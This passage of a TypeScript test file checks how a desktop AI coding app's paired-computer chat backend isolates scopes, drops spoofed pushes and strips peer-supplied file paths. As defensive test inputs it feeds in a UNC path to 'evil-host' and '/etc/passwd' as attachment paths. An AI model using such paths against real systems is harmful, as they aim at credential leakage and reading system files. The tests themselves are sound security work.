    expect(chatBackendFor({ projectId: 'local-proj' })).not.toBe(
      chatBackendFor({ projectId: qMac('proj-1') }),
    );
  });

  it('keeps paired-computer capabilities strict, isolates two computers, and renders approvals and queued rows read-only', async () => {
    const localCaps = createDesktopCapabilities('linux', {}, {});
    const pairedCaps = pairedComputerScopeCapabilities(localCaps, {
      composer: true,
    });

    expect(pairedCaps.chatTabCreation).toBe(false);
    expect(pairedCaps.chatQueueEdits).toBe(false);
    expect(pairedCaps.chatQueueCancel).toBe(false);
    expect(pairedCaps.chatApprovalMode).toBe(false);
    expect(pairedCaps.chatApprovalModeReadOnly).toBe(true);
    expect(pairedCaps.chatApprovalRespond).toBe(false);
    expect(pairedCaps.chatModelChange).toBe(false);
    expect(pairedCaps.chatReadState).toBe(false);
    expect(pairedCaps.chatThinkingLevel).toBe(false);
    expect(pairedCaps.chatFastMode).toBe(false);
    expect(pairedCaps.chatPluginSelections).toBe(false);
    expect(pairedCaps.chatWorkflows?.planMode).toBe(false);
    expect(pairedCaps.fileSystemAccess).toBe('none');
    expect(pairedCaps.terminalPty).toBe(false);

    // Local capabilities keep every editable affordance enabled.
    expect(localCaps.chatTabCreation).toBe(true);
    expect(localCaps.chatQueueCancel).toBe(true);
    expect(localCaps.chatApprovalRespond).toBe(true);
    expect(localCaps.chatModelChange).toBe(true);

    // Two paired computers with identical local IDs never collide in catalogs or picker rows.
    const pickerRows = pairedComputerPickerModels(
      pairedComputerModelList(
        {
          byDevice: {
            [MAC]: projectPairedModelRegistrySnapshot(REMOTE_MODEL_SNAPSHOT),
          },
          aliasesByDevice: {},
          failed: {},
        },
        qMac('proj-1'),
      ),
      'unlisted-remote-model',
    );
    expect(pickerRows.map((m) => m.id)).toEqual([
      'claude-remote-only',
      'codex-remote-1',
      'unlisted-remote-model',
    ]);
    expect(pickerRows.at(-1)?.available).toBe(false);
    expect(qMac('chat-1')).not.toBe(qLinux('chat-1'));

    // ToolApprovalDock renders both tool approvals and secret-input approvals read-only.
    const fake = makeFakePairedComputersApi();
    await setOneWindowSwitchForTest(true, fake.api);
    publishPairedComputerConnectionState(MAC, CONNECTED_FULL);
    const toolApproval = makeWireApproval(qMac('req-tool'), {
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
      chatId: qMac('chat-1'),
    });
    const secretApproval = makeWireApproval(qMac('req-secret'), {
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
      chatId: qMac('chat-1'),
      secretInput: {
        kind: 'secret-input',
        bindingId: 'bind-1',
        label: 'API key',
      },
    });
    useChatStore.setState({
      pendingApprovals: {
        [toolApproval.requestId]: toolApproval,
      },
    });

    const client = createDesktopCanopyClient();
    const container = document.createElement('div');
    document.body.appendChild(container);
    const root: Root = createRoot(container);

    act(() => {
      root.render(
        createElement(CanopyClientProvider, {
          client,
          children: createElement(ToolApprovalDock, {
            projectId: qMac('proj-1'),
            worktreeId: qMac('wt-1'),
            chatId: qMac('chat-1'),
          }),
        }),
      );
    });
    expect(
      container.querySelector('[data-testid="tool-approval-allow"]'),
    ).toBeNull();
    expect(container.textContent).toContain('Answer on the paired computer.');

    act(() => {
      useChatStore.setState({
        pendingApprovals: {
          [secretApproval.requestId]: secretApproval,
        },
      });
    });
    expect(
      container.querySelector('[data-testid="tool-approval-secret-input"]'),
    ).toBeNull();
    expect(
      container.querySelector('[data-testid="tool-approval-read-only-hint"]')
        ?.textContent,
    ).toContain('Answer on the paired computer.');

    // QueuedMessageCompactRow hides Edit, Steer, Run now, and Cancel when omitted for paired scopes.
    act(() => {
      root.render(
        createElement(QueuedMessageCompactRow, {
          message: {
            text: 'Queued on Mac',
            hostQueueEntryId: 'q-1',
            origin: 'desktop',
          },
          index: 0,
        }),
      );
    });
    expect(container.textContent).toContain('Queued on Mac');
    expect(container.querySelectorAll('button')).toHaveLength(0);

    act(() => {
      root.unmount();
    });
    container.remove();
  });

  it('drops spoofed cross-device or undeclared pushes, rejects mismatched getState scopes, and strips peer attachment paths', async () => {
    const uncPath = '\\\\evil-host\\share\\secret.png';
    const rawSnapshot = makeWireSnapshot({
      revision: 1,
      messages: [
        {
          ...makeMessage('m-1', 'user', 'With peer attachment'),
          attachmentPaths: [uncPath, '/etc/passwd'],
          attachmentPromptContexts: [
            { attachmentPath: uncPath, promptKind: 'in-app-browser-resource' },
          ],
        },
      ],
    });
    let returnMismatchedScope = false;

    const fake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'chat:get-state') {
          return returnMismatchedScope
            ? { ...rawSnapshot, projectId: 'proj-other' }
            : rawSnapshot;
        }
        if (channel === 'chat:get-transcript-page') {
          return {
            transcriptRevision: 1,
            messages: [
              {
                ...makeMessage('m-old', 'user', 'Paged attachment'),
                attachmentPaths: [uncPath],
                attachmentPromptContexts: [
                  {
                    attachmentPath: uncPath,
                    promptKind: 'in-app-browser-resource',
                  },
                ],
              },
            ],
            hasMoreBefore: false,
            totalCount: 1,
          };
        }
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        if (channel === 'approval:pending-requests') return [];
        return undefined;
      },
    });

    const core = createPairedComputerChatBackendCore({
      getApi: () => fake.api,
    });
    const stateEvents: ChatStateChangedEvent[] = [];
    const chatEvents: ChatEvent[] = [];
    const queueEvents: ChatQueueUpdatedEvent[] = [];
    const approvalEvents: ApprovalRequestEvent[] = [];
    const autoResolvedEvents: Array<{ requestId: string }> = [];
    core.backend.chat.onStateChanged((e) => stateEvents.push(e));
    core.backend.chat.onChatEvent((e) => chatEvents.push(e));
    core.backend.chat.onChatQueueUpdated((e) => queueEvents.push(e));
    core.backend.approvals.onRequest((e) => approvalEvents.push(e));
    core.backend.approvals.onAutoResolved((e) => autoResolvedEvents.push(e));

    await core.backend.chat.setStateScopes({
      kind: 'scopes',
      scopes: [{ projectId: qMac('proj-1'), worktreeId: qMac('wt-1') }],
    });

    // getState strips peer-supplied attachment paths and prompt contexts.
    const snapshot = await core.backend.chat.getState({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
    });
    expect(
      snapshot.tabsFile.tabs[0]?.messages[0]?.attachmentPaths,
    ).toBeUndefined();
    expect(
      snapshot.tabsFile.tabs[0]?.messages[0]?.attachmentPromptContexts,
    ).toBeUndefined();

    // getTranscriptPage strips peer-supplied attachment paths and prompt contexts.
    const page = await core.backend.chat.getTranscriptPage({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
      chatId: qMac('chat-1'),
    });
    expect(page.messages[0]?.attachmentPaths).toBeUndefined();
    expect(page.messages[0]?.attachmentPromptContexts).toBeUndefined();

    // getState rejects a peer snapshot whose scope mismatches the request.
    returnMismatchedScope = true;
    await expect(
      core.backend.chat.getState({
        projectId: qMac('proj-1'),
        worktreeId: qMac('wt-1'),
      }),
    ).rejects.toThrow(/unexpected scope/i);
    returnMismatchedScope = false;

    // Spoofed cross-device IDs in pushes from MAC are dropped.
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:state-changed',
      args: [
        {
          schemaVersion: 1,
          eventId: 'ev-spoof',
          occurredAt: '2026-11-25T19:00:00Z',
          projectId: qLinux('proj-1'),
          worktreeId: qLinux('wt-1'),
          baseRevision: 1,
          revision: 2,
          changes: [],
        },
      ],
    });
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:event',
      args: [
        {
          projectId: 'proj-1',
          worktreeId: 'wt-1',
          chatId: qLinux('chat-1'),
          type: 'text_delta',
          data: { delta: 'spoofed' },
        },
      ],
    });
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'approval:request',
      args: [makeWireApproval(qLinux('req-spoof'))],
    });

    // Undeclared-scope pushes are dropped on every channel.
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:state-changed',
      args: [
        {
          schemaVersion: 1,
          eventId: 'ev-undeclared',
          occurredAt: '2026-11-25T19:00:00Z',
          projectId: 'proj-undeclared',
          worktreeId: 'wt-1',
          baseRevision: 1,
          revision: 2,
          changes: [],
        },
      ],
    });
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:event',
      args: [
        {
          projectId: 'proj-undeclared',
          worktreeId: 'wt-1',
          chatId: 'chat-1',
          type: 'text_delta',
          data: { delta: 'undeclared' },
        },
      ],
    });
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:queue-updated',
      args: [
        {
          projectId: 'proj-undeclared',
          worktreeId: 'wt-1',
          chatId: 'chat-1',
          queue: [],
        },
      ],
    });
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'approval:auto-resolved',
      args: [
        {
          requestId: 'req-1',
          projectId: 'proj-undeclared',
          worktreeId: 'wt-1',
          chatId: 'chat-1',
          resolution: 'approved',
        },
      ],
    });

    expect(stateEvents).toHaveLength(0);
    expect(chatEvents).toHaveLength(0);
    expect(queueEvents).toHaveLength(0);
    expect(approvalEvents).toHaveLength(0);
    expect(autoResolvedEvents).toHaveLength(0);

    // Valid declared-scope pushes strip attachment paths on live deltas and queues.
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:state-changed',
      args: [
        {
          schemaVersion: 1,
          eventId: 'ev-live-attach',
          occurredAt: '2026-11-25T19:01:00Z',
          projectId: 'proj-1',
          worktreeId: 'wt-1',
          baseRevision: 1,
          revision: 2,
          changes: [
            {
              type: 'message.upserted',
              chatId: 'chat-1',
              message: {
                ...makeMessage('m-2', 'user', 'Live attachment'),
                attachmentPaths: [uncPath],
                attachmentPromptContexts: [
                  {
                    attachmentPath: uncPath,
                    promptKind: 'in-app-browser-resource',
                  },
                ],
              },
            },
          ],
        },
      ],
    });
    expect(stateEvents).toHaveLength(1);
    const upserted = stateEvents[0]?.changes[0];
    expect(upserted?.type).toBe('message.upserted');
    if (upserted?.type === 'message.upserted') {
      expect(upserted.message.attachmentPaths).toBeUndefined();
      expect(upserted.message.attachmentPromptContexts).toBeUndefined();
    }

    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:queue-updated',
      args: [
        {
          projectId: 'proj-1',
          worktreeId: 'wt-1',
          chatId: 'chat-1',
          queue: [
            {
              id: 'q-attach',
              text: 'Queued with attachment',
              origin: 'desktop',
              enqueuedAtMs: 1_700_000_000_900,
              attachmentPaths: [uncPath],
              attachmentPromptContexts: [
                {
                  attachmentPath: uncPath,
                  promptKind: 'in-app-browser-resource',
                },
              ],
            },
          ],
        },
      ],
    });
    expect(queueEvents).toHaveLength(1);
    expect(queueEvents[0]?.queue[0]?.attachmentPaths).toBeUndefined();
    expect(queueEvents[0]?.queue[0]?.attachmentPromptContexts).toBeUndefined();
  });

  it('preserves declared scopes across hold release, recovers from refresh_error on reconnect, and ignores stale snapshot runtime for Stop', async () => {
    // Part A: hold release preserves declared scopes and interest, and re-hold recovers.
    let reconnectedScopes: Array<{ projectId: string; worktreeId: string }> =
      [];
    const fakeHold = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        if (channel === 'approval:pending-requests') return [];
        if (channel === 'approval:resolved-default') return 'ask';
        return undefined;
      },
    });
    const core = createPairedComputerChatBackendCore({
      getApi: () => fakeHold.api,
      onDeviceReconnected: (_deviceId, scopes) => {
        reconnectedScopes = [...scopes];
      },
    });
    await core.backend.chat.setStateScopes({
      kind: 'scopes',
      scopes: [{ projectId: qMac('proj-1'), worktreeId: qMac('wt-1') }],
    });
    await core.setInterest({
      focused: [
        {
          projectId: qMac('proj-1'),
          worktreeId: qMac('wt-1'),
          chatId: qMac('chat-1'),
        },
      ],
      warm: [],
    });
    // Host ends session -> hold is released, but declared scopes & interest stay remembered.
    fakeHold.emitState(MAC, {
      status: 'unavailable',
      reason: 'ended',
      message: null,
    });
    expect(fakeHold.released).toEqual([MAC]);
    const scopesBeforeRehold = fakeHold.invokes.filter(
      (i) => i.channel === 'chat:set-state-scopes',
    ).length;
    const interestBeforeRehold = fakeHold.invokes.filter(
      (i) => i.channel === 'chat:set-interest',
    ).length;

    // Device comes back online; re-holding restores scopes, interest, and triggers reconnect recovery.
    fakeHold.emitState(MAC, CONNECTED_FULL);
    await core.backend.approvals.getResolvedDefault({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
    });
    await Promise.resolve();
    await Promise.resolve();
    expect(
      fakeHold.invokes.filter((i) => i.channel === 'chat:set-state-scopes')
        .length,
    ).toBeGreaterThan(scopesBeforeRehold);
    expect(
      fakeHold.invokes.filter((i) => i.channel === 'chat:set-interest').length,
    ).toBeGreaterThan(interestBeforeRehold);
    expect(reconnectedScopes).toEqual([
      { projectId: qMac('proj-1'), worktreeId: qMac('wt-1') },
    ]);

    // Part B: older getState snapshot cannot clobber newer runtime.patched for exact Stop.
    let resolveStaleSnapshot: ((snap: ChatStateSnapshot) => void) | undefined;
    let lastCancelPayload: unknown;
    const fakeStop = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel, args) => {
        if (channel === 'chat:get-state') {
          return new Promise<ChatStateSnapshot>((resolve) => {
            resolveStaleSnapshot = resolve;
          });
        }
        if (channel === 'chat:cancel') {
          lastCancelPayload = args[0];
          return { outcome: 'stop_requested' };
        }
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        if (channel === 'approval:pending-requests') return [];
        return undefined;
      },
    });
    const stopCore = createPairedComputerChatBackendCore({
      getApi: () => fakeStop.api,
    });
    await stopCore.backend.chat.setStateScopes({
      kind: 'scopes',
      scopes: [{ projectId: qMac('proj-1'), worktreeId: qMac('wt-1') }],
    });
    const staleSnapshotPromise = stopCore.backend.chat.getState({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
    });
    // Wait a tick for chat:get-state to be in flight.
    await Promise.resolve();
    await Promise.resolve();
    // Newer revision 5 runtime arrives before the stale revision 2 snapshot resolves.
    fakeStop.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:state-changed',
      args: [
        {
          schemaVersion: 1,
          eventId: 'ev-5',
          occurredAt: '2026-11-25T19:05:00Z',
          projectId: 'proj-1',
          worktreeId: 'wt-1',
          baseRevision: 4,
          revision: 5,
          changes: [
            {
              type: 'runtime.patched',
              chatId: 'chat-1',
              runtime: {
                status: 'streaming',
                activeTurn: {
                  userMessageId: 'user-msg-new',
                  startedAt: 1_700_000_005_000,
                },
                queuedMessageIds: [],
              },
            },
          ],
        },
      ],
    });
    resolveStaleSnapshot?.(
      makeWireSnapshot({
        revision: 2,
        activeTurnUserMessageId: 'user-msg-old',
      }),
    );
    await staleSnapshotPromise;
    await stopCore.backend.chat.cancel({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
      chatId: qMac('chat-1'),
    });
    expect(lastCancelPayload).toEqual({
      projectId: 'proj-1',
      worktreeId: 'wt-1',
      chatId: 'chat-1',
      expectedUserMessageId: 'user-msg-new',
    });

    // Part C: reconnect recovers a scope stuck in refresh_error.
    let failGetState = false;
    let storeWireSnapshot = makeWireSnapshot({
      revision: 1,
      messages: [makeMessage('m-1', 'user', 'Before outage')],
    });
    const fakeStore = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'chat:get-state') {
          if (failGetState) {
            throw new Error('Paired computer disconnected');
          }
          return storeWireSnapshot;
        }
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        if (channel === 'approval:pending-requests') return [];
        return undefined;
      },
    });
    await setOneWindowSwitchForTest(true, fakeStore.api);
    await useChatStore
      .getState()
      .hydrateChatScopeRevisioned(qMac('proj-1'), qMac('wt-1'));
    const scopeKey = `${qMac('proj-1')}/${qMac('wt-1')}`;

    // Trigger refresh_error while disconnected.
    failGetState = true;
    fakeStore.emitState(MAC, { status: 'connecting' });
    useChatStore
      .getState()
      .recoverChatScopeAfterReconnect(qMac('proj-1'), qMac('wt-1'));
    await new Promise((resolve) => setTimeout(resolve, 25));
    expect(useChatStore.getState().chatStateSync[scopeKey]?.phase).toBe(
      'refresh_error',
    );

    // Reconnect with a newer snapshot -> scope automatically leaves refresh_error and loads missed message.
    failGetState = false;
    storeWireSnapshot = makeWireSnapshot({
      revision: 3,
      messages: [
        makeMessage('m-1', 'user', 'Before outage'),
        makeMessage('m-missed', 'assistant', 'Recovered after refresh_error'),
      ],
    });
    await act(async () => {
      fakeStore.emitState(MAC, CONNECTED_FULL);
      fakeStore.emitUpdate(MAC, { type: 'reconnected' });
      await new Promise((resolve) => setTimeout(resolve, 25));
    });
    expect(useChatStore.getState().chatStateSync[scopeKey]?.phase).toBe('live');
    expect(
      useChatStore
        .getState()
        .worktreeChats[scopeKey]?.tabs[0]?.messages.map((m) => m.id),
    ).toEqual(['m-1', 'm-missed']);
  });

  it('never falls back to local IPC for paired questions and keeps the paired model picker browsable read-only', async () => {
    const fake = makeFakePairedComputersApi();
    await setOneWindowSwitchForTest(true, fake.api);

    useChatStore.setState({
      pendingQuestions: {
        'q-remote-1': {
          requestId: 'q-remote-1',
          projectId: qMac('proj-1'),
          worktreeId: qMac('wt-1'),
          chatId: qMac('chat-1'),
          questions: [
            {
              question: 'Pick an option',
              header: 'Choice',
              options: ['A'],
              multiSelect: false,
            },
          ],
        },
      },
    });

    await expect(
      useChatStore
        .getState()
        .answerMcpQuestionAndWait('q-remote-1', [
          { question: 'Pick an option', selectedOptions: ['A'] },
        ]),
    ).rejects.toThrow(/not accepted/i);
    await expect(
      useChatStore.getState().dismissMcpQuestionAndWait('q-remote-1'),
    ).rejects.toThrow(/not accepted/i);
    expect(localMcpQuestionCalls).toEqual([]);
    expect(fake.invokes).toEqual([]);

    // Read-only RemoteControlModelPicker opens to browse models without calling onSelect.
    const onSelect = jest.fn();
    const pickerModels = pairedComputerPickerModels(
      pairedComputerModelList(
        {
          byDevice: {
            [MAC]: projectPairedModelRegistrySnapshot(REMOTE_MODEL_SNAPSHOT),
          },
          aliasesByDevice: {},
          failed: {},
        },
        qMac('proj-1'),
      ),
      'claude-remote-only',
    );
    const container = document.createElement('div');
    document.body.appendChild(container);
    const root: Root = createRoot(container);

    await act(async () => {
      root.render(
        createElement(RemoteControlModelPicker, {
          catalog: pickerModels,
          currentModel: 'claude-remote-only',
          currentModelLabel: 'Claude Remote Only',
          providerType: 'claude',
          readOnlyReason: 'Change model on the paired computer.',
          openSignal: 0,
          onSelect,
        }),
      );
      await Promise.resolve();
    });
    await act(async () => {
      root.render(
        createElement(RemoteControlModelPicker, {
          catalog: pickerModels,
          currentModel: 'claude-remote-only',
          currentModelLabel: 'Claude Remote Only',
          providerType: 'claude',
          readOnlyReason: 'Change model on the paired computer.',
          openSignal: 1,
          onSelect,
        }),
      );
      await Promise.resolve();
    });

    expect(document.body.textContent).toContain('Claude Remote Only');
    const optionButtons = Array.from(
      document.querySelectorAll<HTMLButtonElement>('[role="menuitemradio"]'),
    );
    expect(optionButtons.length).toBeGreaterThan(0);
    for (const btn of optionButtons) {
      act(() => btn.click());
    }
    expect(onSelect).not.toHaveBeenCalled();

    act(() => {
      root.unmount();
    });
    container.remove();
  });

  it('skips local claudeTerminal lookup on send, keeps controller active tab across host switches/reconnect, and sanitizes live transcript-sync events & previews', async () => {
    const uncPath = '\\\\evil-host\\share\\live.png';
    const sentCommands: unknown[] = [];
    const twoTabSnapshot = (revision: number): ChatStateSnapshot => ({
      ...makeWireSnapshot({ revision }),
      tabsFile: {
        version: 1,
        revision,
        activeTabId: 'chat-1',
        tabs: [
          {
            id: 'chat-1',
            kind: 'chat',
            title: 'Paired Claude terminal chat',
            providerType: 'claude',
            model: 'claude-remote-only',
            approvalMode: 'ask',
            createdAt: '2026-11-25T17:00:00.000Z',
            messages: [makeMessage('m-1', 'user', 'Tab 1')],
            claudeTerminal: {
              terminalId: 'remote-term-1',
              turnState: 'idle',
            },
          },
          {
            id: 'chat-2',
            kind: 'chat',
            title: 'Second remote chat',
            providerType: 'claude',
            model: 'claude-remote-only',
            approvalMode: 'ask',
            createdAt: '2026-11-25T17:05:00.000Z',
            messages: [makeMessage('m-2', 'user', 'Tab 2')],
          },
        ],
      },
      runtimeByChatId: {
        'chat-1': { status: 'idle', queuedMessageIds: [] },
        'chat-2': { status: 'idle', queuedMessageIds: [] },
      },
    });
    let currentRevision = 1;
    const fake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel, args) => {
        if (channel === 'chat:get-state')
          return twoTabSnapshot(currentRevision);
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        if (channel === 'approval:pending-requests') return [];
        if (channel === 'approval:resolved-default') return 'ask';
        if (channel === 'chat:command') {
          sentCommands.push(args[0]);
          return {
            commandId: (args[0] as ChatCommandEnvelope).commandId,
            revision: currentRevision + 1,
            outcome: 'applied',
          };
        }
        return undefined;
      },
    });

    await setOneWindowSwitchForTest(true, fake.api);
    await useChatStore
      .getState()
      .hydrateChatScopeRevisioned(qMac('proj-1'), qMac('wt-1'));
    const scopeKey = `${qMac('proj-1')}/${qMac('wt-1')}`;

    const unsubState = chatBackendFor({
      projectId: qMac('proj-1'),
    }).chat.onStateChanged((event) => {
      useChatStore.getState().handleChatStateChanged(event);
    });

    // 1. Sending to a paired Claude tab with host claudeTerminal metadata never calls local claudeTerminal.getState.
    await useChatStore
      .getState()
      .sendMessage('Hello remote Claude', undefined, {
        projectId: qMac('proj-1'),
        worktreeId: qMac('wt-1'),
        chatId: qMac('chat-1'),
      });
    expect(localClaudeTerminalCalls).toEqual([]);
    expect(sentCommands).toHaveLength(1);
    expect(sentCommands[0]).toMatchObject({
      projectId: 'proj-1',
      worktreeId: 'wt-1',
      command: {
        type: 'chat.send_message',
        chatId: 'chat-1',
        text: 'Hello remote Claude',
      },
    });

    // 2. Controller switches to chat-2 locally; host tab.active_changed and reconnect refresh keep chat-2 active.
    useChatStore.setState((state) => {
      const wc = state.worktreeChats[scopeKey];
      if (!wc) return state;
      return {
        worktreeChats: {
          ...state.worktreeChats,
          [scopeKey]: {
            ...wc,
            activeTabId: qMac('chat-2'),
            lastActiveEditableChatId: qMac('chat-2'),
          },
        },
      };
    });
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:state-changed',
      args: [
        {
          schemaVersion: 1,
          eventId: 'ev-host-active-1',
          occurredAt: '2026-11-25T19:40:00Z',
          projectId: 'proj-1',
          worktreeId: 'wt-1',
          baseRevision: 1,
          revision: 2,
          changes: [
            {
              type: 'tab.active_changed',
              activeTabId: 'chat-1',
              lastActiveEditableChatId: 'chat-1',
            },
          ],
        },
      ],
    });
    expect(useChatStore.getState().worktreeChats[scopeKey]?.activeTabId).toBe(
      qMac('chat-2'),
    );
    expect(useChatStore.getState().chatStateSync[scopeKey]?.revision).toBe(2);

    // Reconnect with snapshot whose host activeTabId is chat-1 still keeps controller on chat-2.
    currentRevision = 3;
    await act(async () => {
      fake.emitState(MAC, { status: 'connecting' });
      fake.emitState(MAC, CONNECTED_FULL);
      fake.emitUpdate(MAC, { type: 'reconnected' });
      await new Promise((resolve) => setTimeout(resolve, 25));
    });
    expect(useChatStore.getState().worktreeChats[scopeKey]?.activeTabId).toBe(
      qMac('chat-2'),
    );
    expect(useChatStore.getState().chatStateSync[scopeKey]?.revision).toBe(3);

    // 3. Live claude_terminal_transcript_sync chat:event strips peer attachmentPaths, attachmentPromptContexts, and transcriptPath.
    const core = createPairedComputerChatBackendCore({
      getApi: () => fake.api,
    });
    const receivedEvents: ChatEvent[] = [];
    core.backend.chat.onChatEvent((event) => receivedEvents.push(event));
    await core.backend.chat.setStateScopes({
      kind: 'scopes',
      scopes: [{ projectId: qMac('proj-1'), worktreeId: qMac('wt-1') }],
    });
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:event',
      args: [
        {
          projectId: 'proj-1',
          worktreeId: 'wt-1',
          chatId: 'chat-1',
          type: 'claude_terminal_transcript_sync',
          data: {
            type: 'claude_terminal_transcript_sync',
            importedEventCount: 1,
            transcriptPath: '/Users/peer/.claude/session.jsonl',
            messages: [
              {
                ...makeMessage('m-sync', 'user', 'Live terminal sync'),
                attachmentPaths: [uncPath],
                attachmentPromptContexts: [
                  {
                    attachmentPath: uncPath,
                    promptKind: 'in-app-browser-resource',
                  },
                ],
              },
            ],
          },
        },
      ],
    });
    expect(receivedEvents).toHaveLength(1);
    const syncData = receivedEvents[0]?.data as {
      transcriptPath?: string;
      messages?: PersistedChatMessage[];
    };
    expect(syncData.transcriptPath).toBeUndefined();
    expect(syncData.messages?.[0]?.attachmentPaths).toBeUndefined();
    expect(syncData.messages?.[0]?.attachmentPromptContexts).toBeUndefined();

    // 4. Defense-in-depth: useImagePreviews inside a paired ChatMarkdownFileTargetContext never calls window.api.readFilePreview.
    function PreviewProbe(): null {
      useImagePreviews([uncPath]);
      return null;
    }
    const container = document.createElement('div');
    document.body.appendChild(container);
    const root: Root = createRoot(container);
    await act(async () => {
      root.render(
        createElement(ChatMarkdownFileTargetContext.Provider, {
          value: { projectId: qMac('proj-1'), worktreeId: qMac('wt-1') },
          children: createElement(PreviewProbe),
        }),
      );
      await Promise.resolve();
    });
    expect(localReadFilePreviewCalls).toEqual([]);
    unsubState();
    act(() => {
      root.unmount();
    });
    container.remove();
  });

  it('releases holds on remote-control-off, fences approval snapshots against live events, gates chatSend, skips empty starter tabs, and strips image paths and output refs', async () => {
    // 1. Negotiated send capability controls chatSend.
    const localCaps = createDesktopCapabilities('linux', {}, {});
    expect(
      pairedComputerScopeCapabilities(localCaps, {
        composer: true,
        send: false,
      }).chatSend,
    ).toBe(false);
    expect(
      pairedComputerScopeCapabilities(localCaps, {
        composer: true,
        send: true,
      }).chatSend,
    ).toBe(true);

    // 2. remote-control-off releases hold while preserving declared scopes, and
    //    pending-approval snapshot reads fence live request/auto-resolved events.
    let resolveApprovalsSnapshot:
      | ((items: ApprovalRequestEvent[]) => void)
      | undefined;
    const publishedApprovalSnapshots: ApprovalRequestEvent[][] = [];
    const fake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'approval:pending-requests') {
          return new Promise<ApprovalRequestEvent[]>((resolve) => {
            resolveApprovalsSnapshot = resolve;
          });
        }
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        if (channel === 'approval:resolved-default') return 'ask';
        if (channel === 'chat:get-state') {
          return makeWireSnapshot({
            revision: 1,
            messages: [
              {
                id: 'm-sanitized',
                role: 'assistant',
                timestamp: 1_700_000_000_000,
                blocks: [
                  {
                    type: 'image',
                    path: '/Users/local/codex-generated-images/secret.png',
                    alt: 'Path-only peer image',
                  },
                  {
                    type: 'image',
                    path: '/Users/local/codex-generated-images/inline.png',
                    dataUrl: 'data:image/png;base64,iVBORw0KGgo=',
                    alt: 'Inline peer image',
                  },
                  {
                    type: 'text',
                    text: 'Preview text',
                    textRef: {
                      version: 1,
                      encoding: 'utf-8',
                      mediaType: 'text/plain',
                      artifactId: 'art-text',
                      byteLength: 1024,
                      sha256: 'abc',
                    },
                  },
                  {
                    type: 'tool_use',
                    toolUseId: 'tu-1',
                    toolName: 'Bash',
                    input: '{"cmd":"ls"}',
                    inputRef: {
                      version: 1,
                      encoding: 'utf-8',
                      mediaType: 'text/plain',
                      artifactId: 'art-in',
                      byteLength: 2048,
                      sha256: 'def',
                    },
                  },
                  {
                    type: 'tool_result',
                    toolUseId: 'tu-1',
                    toolName: 'Bash',
                    output: 'inline preview',
                    isError: false,
                    fullOutputRef: {
                      version: 1,
                      encoding: 'utf-8',
                      mediaType: 'text/plain',
                      artifactId: 'art-out',
                      byteLength: 4096,
                      sha256: 'ghi',
                    },
                  },
                ],
              },
            ],
          });
        }
        return undefined;
      },
    });
    const core = createPairedComputerChatBackendCore({
      getApi: () => fake.api,
      onPendingApprovalsSnapshot: (_deviceId, approvals) => {
        publishedApprovalSnapshots.push([...approvals]);
      },
    });

    await core.backend.chat.setStateScopes({
      kind: 'scopes',
      scopes: [{ projectId: qMac('proj-1'), worktreeId: qMac('wt-1') }],
    });
    // Wait for approval:pending-requests to be in flight.
    await Promise.resolve();
    await Promise.resolve();

    // While snapshot read is in flight: req-newer arrives and req-settled auto-resolves.
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'approval:request',
      args: [makeWireApproval('req-newer')],
    });
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'approval:auto-resolved',
      args: [
        {
          requestId: 'req-settled',
          projectId: 'proj-1',
          worktreeId: 'wt-1',
          chatId: 'chat-1',
          resolution: 'approved',
        },
      ],
    });
    // Older snapshot returns [req-settled, req-still-open] (missing req-newer, still containing req-settled).
    resolveApprovalsSnapshot?.([
      makeWireApproval('req-settled'),
      makeWireApproval('req-still-open'),
    ]);
    await Promise.resolve();
    await Promise.resolve();

    const reconciledIds = (publishedApprovalSnapshots.at(-1) ?? [])
      .map((item) => item.requestId)
      .sort();
    expect(reconciledIds).toEqual([qMac('req-newer'), qMac('req-still-open')]);

    // 3. Snapshot sanitization strips image paths (keeping inline dataUrl) and deferred output refs.
    const sanitizedSnapshot = await core.backend.chat.getState({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
    });
    const blocks =
      sanitizedSnapshot.tabsFile.tabs[0]?.messages[0]?.blocks ?? [];
    expect(blocks[0]).toMatchObject({ type: 'image', path: '' });
    expect(blocks[1]).toMatchObject({
      type: 'image',
      path: '',
      dataUrl: 'data:image/png;base64,iVBORw0KGgo=',
    });
    expect(
      blocks[2]?.type === 'text' ? blocks[2].textRef : 'wrong',
    ).toBeUndefined();
    expect(
      blocks[3]?.type === 'tool_use' ? blocks[3].inputRef : 'wrong',
    ).toBeUndefined();
    expect(
      blocks[4]?.type === 'tool_result' ? blocks[4].fullOutputRef : 'wrong',
    ).toBeUndefined();

